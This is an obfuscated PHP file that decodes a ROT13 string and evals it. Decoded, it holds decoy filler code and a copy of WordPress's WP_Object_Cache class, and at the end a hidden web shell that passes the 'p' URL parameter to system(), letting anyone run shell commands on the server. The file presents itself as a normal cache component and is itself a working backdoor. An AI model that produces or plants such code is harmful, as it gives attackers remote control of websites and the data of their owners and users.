<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Bowrpg Pnpur NCV: JC_Bowrpg_Pnpur pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Pnpur
 * @fvapr 5.4.0
 */

/**
 * Pber pynff gung vzcyrzragf na bowrpg pnpur.
 *
 * Gur JbeqCerff Bowrpg Pnpur vf hfrq gb fnir ba gevcf gb gur qngnonfr. Gur
 * Bowrpg Pnpur fgberf nyy bs gur pnpur qngn gb zrzbel naq znxrf gur pnpur
 * pbagragf ninvynoyr ol hfvat n xrl, juvpu vf hfrq gb anzr naq yngre ergevrir
 * gur pnpur pbagragf.
 *
 * Gur Bowrpg Pnpur pna or ercynprq ol bgure pnpuvat zrpunavfzf ol cynpvat svyrf
 * va gur jc-pbagrag sbyqre juvpu vf ybbxrq ng va jc-frggvatf. Vs gung svyr
 * rkvfgf, gura guvf svyr jvyy abg or vapyhqrq.
 *
 * @fvapr 2.0.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Bowrpg_Pnpur {

	/**
	 * Ubyqf gur pnpurq bowrpgf.
	 *
	 * @fvapr 2.0.0
	 * @ine neenl
	 */
	cevingr $pnpur = neenl();

	/**
	 * Gur nzbhag bs gvzrf gur pnpur qngn jnf nyernql fgberq va gur pnpur.
	 *
	 * @fvapr 2.5.0
	 * @ine vag
	 */
	choyvp $pnpur_uvgf = 0;

	/**
	 * Nzbhag bs gvzrf gur pnpur qvq abg unir gur erdhrfg va pnpur.
	 *
	 * @fvapr 2.0.0
	 * @ine vag
	 */
	choyvp $pnpur_zvffrf = 0;

	/**
	 * Yvfg bs tybony pnpur tebhcf.
	 *
	 * @fvapr 3.0.0
	 * @ine fgevat[]
	 */
	cebgrpgrq $tybony_tebhcf = neenl();

	/**
	 * Gur oybt cersvk gb cercraq gb xrlf va aba-tybony tebhcf.
	 *
	 * @fvapr 3.5.0
	 * @ine fgevat
	 */
	cevingr $oybt_cersvk;

	/**
	 * Ubyqf gur inyhr bs vf_zhygvfvgr().
	 *
	 * @fvapr 3.5.0
	 * @ine obby
	 */
	cevingr $zhygvfvgr;

	/**
	 * Frgf hc bowrpg cebcregvrf.
	 *
	 * @fvapr 2.0.8
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->zhygvfvgr   = vf_zhygvfvgr();
		$guvf->oybt_cersvk = $guvf->zhygvfvgr ? trg_pheerag_oybt_vq() . ':' : '';
	}

	/**
	 * Znxrf cevingr cebcregvrf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr Cebcregl gb trg.
	 * @erghea zvkrq Cebcregl.
	 */
	choyvp shapgvba __trg( $anzr ) {
		erghea $guvf->$anzr;
	}

	/**
	 * Znxrf cevingr cebcregvrf frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr  Cebcregl gb frg.
	 * @cnenz zvkrq  $inyhr Cebcregl inyhr.
	 */
	choyvp shapgvba __frg( $anzr, $inyhr ) {
		$guvf->$anzr = $inyhr;
	}

	/**
	 * Znxrf cevingr cebcregvrf purpxnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr Cebcregl gb purpx vs frg.
	 * @erghea obby Jurgure gur cebcregl vf frg.
	 */
	choyvp shapgvba __vffrg( $anzr ) {
		erghea vffrg( $guvf->$anzr );
	}

	/**
	 * Znxrf cevingr cebcregvrf ha-frggnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr Cebcregl gb hafrg.
	 */
	choyvp shapgvba __hafrg( $anzr ) {
		hafrg( $guvf->$anzr );
	}

	/**
	 * Freirf nf n hgvyvgl shapgvba gb qrgrezvar jurgure n xrl vf inyvq.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz vag|fgevat $xrl Pnpur xrl gb purpx sbe inyvqvgl.
	 * @erghea obby Jurgure gur xrl vf inyvq.
	 */
	cebgrpgrq shapgvba vf_inyvq_xrl( $xrl ) {
		vs ( vf_vag( $xrl ) ) {
			erghea gehr;
		}

		vs ( vf_fgevat( $xrl ) && gevz( $xrl ) !== '' ) {
			erghea gehr;
		}

		$glcr = trgglcr( $xrl );

		vs ( ! shapgvba_rkvfgf( '__' ) ) {
			jc_ybnq_genafyngvbaf_rneyl();
		}

		$zrffntr = vf_fgevat( $xrl )
			? __( 'Pnpur xrl zhfg abg or na rzcgl fgevat.' )
			/* genafyngbef: %f: Gur glcr bs gur tvira pnpur xrl. */
			: fcevags( __( 'Pnpur xrl zhfg or na vagrtre be n aba-rzcgl fgevat, %f tvira.' ), $glcr );

		_qbvat_vg_jebat(
			fcevags( '%f::%f', __PYNFF__, qroht_onpxgenpr( QROHT_ONPXGENPR_VTABER_NETF, 2 )[1]['shapgvba'] ),
			$zrffntr,
			'6.1.0'
		);

		erghea snyfr;
	}

	/**
	 * Freirf nf n hgvyvgl shapgvba gb qrgrezvar jurgure n xrl rkvfgf va gur pnpur.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz vag|fgevat $xrl   Pnpur xrl gb purpx sbe rkvfgrapr.
	 * @cnenz fgevat     $tebhc Pnpur tebhc sbe gur xrl rkvfgrapr purpx.
	 * @erghea obby Jurgure gur xrl rkvfgf va gur pnpur sbe gur tvira tebhc.
	 */
	cebgrpgrq shapgvba _rkvfgf( $xrl, $tebhc ) {
		erghea vffrg( $guvf->pnpur[ $tebhc ] ) && ( vffrg( $guvf->pnpur[ $tebhc ][ $xrl ] ) || neenl_xrl_rkvfgf( $xrl, $guvf->pnpur[ $tebhc ] ) );
	}

	/**
	 * Nqqf qngn gb gur pnpur vs vg qbrfa'g nyernql rkvfg.
	 *
	 * @fvapr 2.0.0
	 *
	 * @hfrf JC_Bowrpg_Pnpur::_rkvfgf() Purpxf gb frr vs gur pnpur nyernql unf qngn.
	 * @hfrf JC_Bowrpg_Pnpur::frg()     Frgf gur qngn nsgre gur purpxvat gur pnpur
	 *                                  pbagragf rkvfgrapr.
	 *
	 * @cnenz vag|fgevat $xrl    Jung gb pnyy gur pbagragf va gur pnpur.
	 * @cnenz zvkrq      $qngn   Gur pbagragf gb fgber va gur pnpur.
	 * @cnenz fgevat     $tebhc  Bcgvbany. Jurer gb tebhc gur pnpur pbagragf. Qrsnhyg 'qrsnhyg'.
	 * @cnenz vag        $rkcver Bcgvbany. Jura gb rkcver gur pnpur pbagragf, va frpbaqf.
	 *                           Qrsnhyg 0 (ab rkcvengvba).
	 * @erghea obby Gehr ba fhpprff, snyfr vs pnpur xrl naq tebhc nyernql rkvfg.
	 */
	choyvp shapgvba nqq( $xrl, $qngn, $tebhc = 'qrsnhyg', $rkcver = 0 ) {
		vs ( jc_fhfcraq_pnpur_nqqvgvba() ) {
			erghea snyfr;
		}

		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		$vq = $xrl;
		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$vq = $guvf->oybt_cersvk . $xrl;
		}

		vs ( $guvf->_rkvfgf( $vq, $tebhc ) ) {
			erghea snyfr;
		}

		erghea $guvf->frg( $xrl, $qngn, $tebhc, (vag) $rkcver );
	}

	/**
	 * Nqqf zhygvcyr inyhrf gb gur pnpur va bar pnyy.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz neenl  $qngn   Neenl bs xrlf naq inyhrf gb or nqqrq.
	 * @cnenz fgevat $tebhc  Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @cnenz vag    $rkcver Bcgvbany. Jura gb rkcver gur pnpur pbagragf, va frpbaqf.
	 *                       Qrsnhyg 0 (ab rkcvengvba).
	 * @erghea obby[] Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *                gehr ba fhpprff, be snyfr vs pnpur xrl naq tebhc nyernql rkvfg.
	 */
	choyvp shapgvba nqq_zhygvcyr( neenl $qngn, $tebhc = '', $rkcver = 0 ) {
		$inyhrf = neenl();

		sbernpu ( $qngn nf $xrl => $inyhr ) {
			$inyhrf[ $xrl ] = $guvf->nqq( $xrl, $inyhr, $tebhc, $rkcver );
		}

		erghea $inyhrf;
	}

	/**
	 * Ercynprf gur pbagragf va gur pnpur, vs pbagragf nyernql rkvfg.
	 *
	 * @fvapr 2.0.0
	 *
	 * @frr JC_Bowrpg_Pnpur::frg()
	 *
	 * @cnenz vag|fgevat $xrl    Jung gb pnyy gur pbagragf va gur pnpur.
	 * @cnenz zvkrq      $qngn   Gur pbagragf gb fgber va gur pnpur.
	 * @cnenz fgevat     $tebhc  Bcgvbany. Jurer gb tebhc gur pnpur pbagragf. Qrsnhyg 'qrsnhyg'.
	 * @cnenz vag        $rkcver Bcgvbany. Jura gb rkcver gur pnpur pbagragf, va frpbaqf.
	 *                           Qrsnhyg 0 (ab rkcvengvba).
	 * @erghea obby Gehr vs pbagragf jrer ercynprq, snyfr vs bevtvany inyhr qbrf abg rkvfg.
	 */
	choyvp shapgvba ercynpr( $xrl, $qngn, $tebhc = 'qrsnhyg', $rkcver = 0 ) {
		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		$vq = $xrl;
		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$vq = $guvf->oybt_cersvk . $xrl;
		}

		vs ( ! $guvf->_rkvfgf( $vq, $tebhc ) ) {
			erghea snyfr;
		}

		erghea $guvf->frg( $xrl, $qngn, $tebhc, (vag) $rkcver );
	}

	/**
	 * Frgf gur qngn pbagragf vagb gur pnpur.
	 *
	 * Gur pnpur pbagragf ner tebhcrq ol gur $tebhc cnenzrgre sbyybjrq ol gur
	 * $xrl. Guvf nyybjf sbe qhcyvpngr VQf va havdhr tebhcf. Gurersber, anzvat bs
	 * gur tebhc fubhyq or hfrq jvgu pner naq fubhyq sbyybj abezny shapgvba
	 * anzvat thvqryvarf bhgfvqr bs pber JbeqCerff hfntr.
	 *
	 * Gur $rkcver cnenzrgre vf abg hfrq, orpnhfr gur pnpur jvyy nhgbzngvpnyyl
	 * rkcver sbe rnpu gvzr n cntr vf npprffrq naq CUC svavfurf. Gur zrgubq vf
	 * zber sbe pnpur cyhtvaf juvpu hfr svyrf.
	 *
	 * @fvapr 2.0.0
	 * @fvapr 6.1.0 Ergheaf snyfr vs pnpur xrl vf vainyvq.
	 *
	 * @cnenz vag|fgevat $xrl    Jung gb pnyy gur pbagragf va gur pnpur.
	 * @cnenz zvkrq      $qngn   Gur pbagragf gb fgber va gur pnpur.
	 * @cnenz fgevat     $tebhc  Bcgvbany. Jurer gb tebhc gur pnpur pbagragf. Qrsnhyg 'qrsnhyg'.
	 * @cnenz vag        $rkcver Bcgvbany. Abg hfrq.
	 * @erghea obby Gehr vs pbagragf jrer frg, snyfr vs xrl vf vainyvq.
	 */
	choyvp shapgvba frg( $xrl, $qngn, $tebhc = 'qrsnhyg', $rkcver = 0 ) {
		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$xrl = $guvf->oybt_cersvk . $xrl;
		}

		vs ( vf_bowrpg( $qngn ) ) {
			$qngn = pybar $qngn;
		}

		$guvf->pnpur[ $tebhc ][ $xrl ] = $qngn;
		erghea gehr;
	}

	/**
	 * Frgf zhygvcyr inyhrf gb gur pnpur va bar pnyy.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz neenl  $qngn   Neenl bs xrl naq inyhr gb or frg.
	 * @cnenz fgevat $tebhc  Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @cnenz vag    $rkcver Bcgvbany. Jura gb rkcver gur pnpur pbagragf, va frpbaqf.
	 *                       Qrsnhyg 0 (ab rkcvengvba).
	 * @erghea obby[] Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf nyjnlf gehr.
	 */
	choyvp shapgvba frg_zhygvcyr( neenl $qngn, $tebhc = '', $rkcver = 0 ) {
		$inyhrf = neenl();

		sbernpu ( $qngn nf $xrl => $inyhr ) {
			$inyhrf[ $xrl ] = $guvf->frg( $xrl, $inyhr, $tebhc, $rkcver );
		}

		erghea $inyhrf;
	}

	/**
	 * Ergevrirf gur pnpur pbagragf, vs vg rkvfgf.
	 *
	 * Gur pbagragf jvyy or svefg nggrzcgrq gb or ergevrirq ol frnepuvat ol gur
	 * xrl va gur pnpur tebhc. Vs gur pnpur vf uvg (fhpprff) gura gur pbagragf
	 * ner erghearq.
	 *
	 * Ba snvyher, gur ahzore bs pnpur zvffrf jvyy or vaperzragrq.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz vag|fgevat $xrl   Gur xrl haqre juvpu gur pnpur pbagragf ner fgberq.
	 * @cnenz fgevat     $tebhc Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg 'qrsnhyg'.
	 * @cnenz obby       $sbepr Bcgvbany. Hahfrq. Jurgure gb sbepr na hcqngr bs gur ybpny pnpur
	 *                          sebz gur crefvfgrag pnpur. Qrsnhyg snyfr.
	 * @cnenz obby|ahyy  $sbhaq Bcgvbany. Jurgure gur xrl jnf sbhaq va gur pnpur (cnffrq ol ersrerapr).
	 *                          Qvfnzovthngrf n erghea bs snyfr, n fgbenoyr inyhr. Qrsnhyg ahyy.
	 * @erghea zvkrq|snyfr Gur pnpur pbagragf ba fhpprff, snyfr ba snvyher gb ergevrir pbagragf.
	 */
	choyvp shapgvba trg( $xrl, $tebhc = 'qrsnhyg', $sbepr = snyfr, &$sbhaq = ahyy ) {
		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$xrl = $guvf->oybt_cersvk . $xrl;
		}

		vs ( $guvf->_rkvfgf( $xrl, $tebhc ) ) {
			$sbhaq             = gehr;
			$guvf->pnpur_uvgf += 1;
			vs ( vf_bowrpg( $guvf->pnpur[ $tebhc ][ $xrl ] ) ) {
				erghea pybar $guvf->pnpur[ $tebhc ][ $xrl ];
			} ryfr {
				erghea $guvf->pnpur[ $tebhc ][ $xrl ];
			}
		}

		$sbhaq               = snyfr;
		$guvf->pnpur_zvffrf += 1;
		erghea snyfr;
	}

	/**
	 * Ergevrirf zhygvcyr inyhrf sebz gur pnpur va bar pnyy.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl  $xrlf  Neenl bs xrlf haqre juvpu gur pnpur pbagragf ner fgberq.
	 * @cnenz fgevat $tebhc Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg 'qrsnhyg'.
	 * @cnenz obby   $sbepr Bcgvbany. Jurgure gb sbepr na hcqngr bs gur ybpny pnpur
	 *                      sebz gur crefvfgrag pnpur. Qrsnhyg snyfr.
	 * @erghea neenl Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *               gur pnpur pbagragf ba fhpprff, be snyfr ba snvyher.
	 */
	choyvp shapgvba trg_zhygvcyr( $xrlf, $tebhc = 'qrsnhyg', $sbepr = snyfr ) {
		$inyhrf = neenl();

		sbernpu ( $xrlf nf $xrl ) {
			$inyhrf[ $xrl ] = $guvf->trg( $xrl, $tebhc, $sbepr );
		}

		erghea $inyhrf;
	}

	/**
	 * Erzbirf gur pbagragf bs gur pnpur xrl va gur tebhc.
	 *
	 * Vs gur pnpur xrl qbrf abg rkvfg va gur tebhc, gura abguvat jvyy unccra.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz vag|fgevat $xrl        Jung gur pbagragf va gur pnpur ner pnyyrq.
	 * @cnenz fgevat     $tebhc      Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg 'qrsnhyg'.
	 * @cnenz obby       $qrcerpngrq Bcgvbany. Hahfrq. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr vs gur pbagragf jrer abg qryrgrq.
	 */
	choyvp shapgvba qryrgr( $xrl, $tebhc = 'qrsnhyg', $qrcerpngrq = snyfr ) {
		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$xrl = $guvf->oybt_cersvk . $xrl;
		}

		vs ( ! $guvf->_rkvfgf( $xrl, $tebhc ) ) {
			erghea snyfr;
		}

		hafrg( $guvf->pnpur[ $tebhc ][ $xrl ] );
		erghea gehr;
	}

	/**
	 * Qryrgrf zhygvcyr inyhrf sebz gur pnpur va bar pnyy.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz neenl  $xrlf  Neenl bs xrlf gb or qryrgrq.
	 * @cnenz fgevat $tebhc Bcgvbany. Jurer gur pnpur pbagragf ner tebhcrq. Qrsnhyg rzcgl.
	 * @erghea obby[] Neenl bs erghea inyhrf, tebhcrq ol xrl. Rnpu inyhr vf rvgure
	 *                gehr ba fhpprff, be snyfr vs gur pbagragf jrer abg qryrgrq.
	 */
	choyvp shapgvba qryrgr_zhygvcyr( neenl $xrlf, $tebhc = '' ) {
		$inyhrf = neenl();

		sbernpu ( $xrlf nf $xrl ) {
			$inyhrf[ $xrl ] = $guvf->qryrgr( $xrl, $tebhc );
		}

		erghea $inyhrf;
	}

	/**
	 * Vaperzragf ahzrevp pnpur vgrz'f inyhr.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz vag|fgevat $xrl    Gur pnpur xrl gb vaperzrag.
	 * @cnenz vag        $bssfrg Bcgvbany. Gur nzbhag ol juvpu gb vaperzrag gur vgrz'f inyhr.
	 *                           Qrsnhyg 1.
	 * @cnenz fgevat     $tebhc  Bcgvbany. Gur tebhc gur xrl vf va. Qrsnhyg 'qrsnhyg'.
	 * @erghea vag|snyfr Gur vgrz'f arj inyhr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba vape( $xrl, $bssfrg = 1, $tebhc = 'qrsnhyg' ) {
		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$xrl = $guvf->oybt_cersvk . $xrl;
		}

		vs ( ! $guvf->_rkvfgf( $xrl, $tebhc ) ) {
			erghea snyfr;
		}

		vs ( ! vf_ahzrevp( $guvf->pnpur[ $tebhc ][ $xrl ] ) ) {
			$guvf->pnpur[ $tebhc ][ $xrl ] = 0;
		}

		$bssfrg = (vag) $bssfrg;

		$guvf->pnpur[ $tebhc ][ $xrl ] += $bssfrg;

		vs ( $guvf->pnpur[ $tebhc ][ $xrl ] < 0 ) {
			$guvf->pnpur[ $tebhc ][ $xrl ] = 0;
		}

		erghea $guvf->pnpur[ $tebhc ][ $xrl ];
	}

	/**
	 * Qrperzragf ahzrevp pnpur vgrz'f inyhr.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz vag|fgevat $xrl    Gur pnpur xrl gb qrperzrag.
	 * @cnenz vag        $bssfrg Bcgvbany. Gur nzbhag ol juvpu gb qrperzrag gur vgrz'f inyhr.
	 *                           Qrsnhyg 1.
	 * @cnenz fgevat     $tebhc  Bcgvbany. Gur tebhc gur xrl vf va. Qrsnhyg 'qrsnhyg'.
	 * @erghea vag|snyfr Gur vgrz'f arj inyhr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qrpe( $xrl, $bssfrg = 1, $tebhc = 'qrsnhyg' ) {
		vs ( ! $guvf->vf_inyvq_xrl( $xrl ) ) {
			erghea snyfr;
		}

		vs ( rzcgl( $tebhc ) ) {
			$tebhc = 'qrsnhyg';
		}

		vs ( $guvf->zhygvfvgr && ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
			$xrl = $guvf->oybt_cersvk . $xrl;
		}

		vs ( ! $guvf->_rkvfgf( $xrl, $tebhc ) ) {
			erghea snyfr;
		}

		vs ( ! vf_ahzrevp( $guvf->pnpur[ $tebhc ][ $xrl ] ) ) {
			$guvf->pnpur[ $tebhc ][ $xrl ] = 0;
		}

		$bssfrg = (vag) $bssfrg;

		$guvf->pnpur[ $tebhc ][ $xrl ] -= $bssfrg;

		vs ( $guvf->pnpur[ $tebhc ][ $xrl ] < 0 ) {
			$guvf->pnpur[ $tebhc ][ $xrl ] = 0;
		}

		erghea $guvf->pnpur[ $tebhc ][ $xrl ];
	}

	/**
	 * Pyrnef gur bowrpg pnpur bs nyy qngn.
	 *
	 * @fvapr 2.0.0
	 *
	 * @erghea gehr Nyjnlf ergheaf gehr.
	 */
	choyvp shapgvba syhfu() {
		$guvf->pnpur = neenl();

		erghea gehr;
	}

	/**
	 * Erzbirf nyy pnpur vgrzf va n tebhc.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $tebhc Anzr bs tebhc gb erzbir sebz pnpur.
	 * @erghea gehr Nyjnlf ergheaf gehr.
	 */
	choyvp shapgvba syhfu_tebhc( $tebhc ) {
		hafrg( $guvf->pnpur[ $tebhc ] );

		erghea gehr;
	}

	/**
	 * Frgf gur yvfg bs tybony pnpur tebhcf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat|fgevat[] $tebhcf Yvfg bs tebhcf gung ner tybony.
	 */
	choyvp shapgvba nqq_tybony_tebhcf( $tebhcf ) {
		$tebhcf = (neenl) $tebhcf;

		$tebhcf              = neenl_svyy_xrlf( $tebhcf, gehr );
		$guvf->tybony_tebhcf = neenl_zretr( $guvf->tybony_tebhcf, $tebhcf );
	}

	/**
	 * Fjvgpurf gur vagreany oybt VQ.
	 *
	 * Guvf punatrf gur oybt VQ hfrq gb perngr xrlf va oybt fcrpvsvp tebhcf.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $oybt_vq Oybt VQ.
	 */
	choyvp shapgvba fjvgpu_gb_oybt( $oybt_vq ) {
		$oybt_vq           = (vag) $oybt_vq;
		$guvf->oybt_cersvk = $guvf->zhygvfvgr ? $oybt_vq . ':' : '';
	}

	/**
	 * Erfrgf pnpur xrlf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @qrcerpngrq 3.5.0 Hfr JC_Bowrpg_Pnpur::fjvgpu_gb_oybt()
	 * @frr fjvgpu_gb_oybt()
	 */
	choyvp shapgvba erfrg() {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '3.5.0', 'JC_Bowrpg_Pnpur::fjvgpu_gb_oybt()' );

		// Pyrne bhg aba-tybony pnpurf fvapr gur oybt VQ unf punatrq.
		sbernpu ( neenl_xrlf( $guvf->pnpur ) nf $tebhc ) {
			vs ( ! vffrg( $guvf->tybony_tebhcf[ $tebhc ] ) ) {
				hafrg( $guvf->pnpur[ $tebhc ] );
			}
		}
	}

	/**
	 * Rpubrf gur fgngf bs gur pnpuvat.
	 *
	 * Tvirf gur pnpur uvgf, naq pnpur zvffrf. Nyfb cevagf rirel pnpurq tebhc,
	 * xrl naq gur qngn.
	 *
	 * @fvapr 2.0.0
	 */
	choyvp shapgvba fgngf() {
		rpub '<c>';
		rpub \"<fgebat>Pnpur Uvgf:</fgebat> {$guvf->pnpur_uvgf}<oe />\";
		rpub \"<fgebat>Pnpur Zvffrf:</fgebat> {$guvf->pnpur_zvffrf}<oe />\";
		rpub '</c>';
		rpub '<hy>';
		sbernpu ( $guvf->pnpur nf $tebhc => $pnpur ) {
			rpub '<yv><fgebat>Tebhc:</fgebat> ' . rfp_ugzy( $tebhc ) . ' - ( ' . ahzore_sbezng( fgeyra( frevnyvmr( $pnpur ) ) / XO_VA_OLGRF, 2 ) . 'x )</yv>';
		}
		rpub '</hy>';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>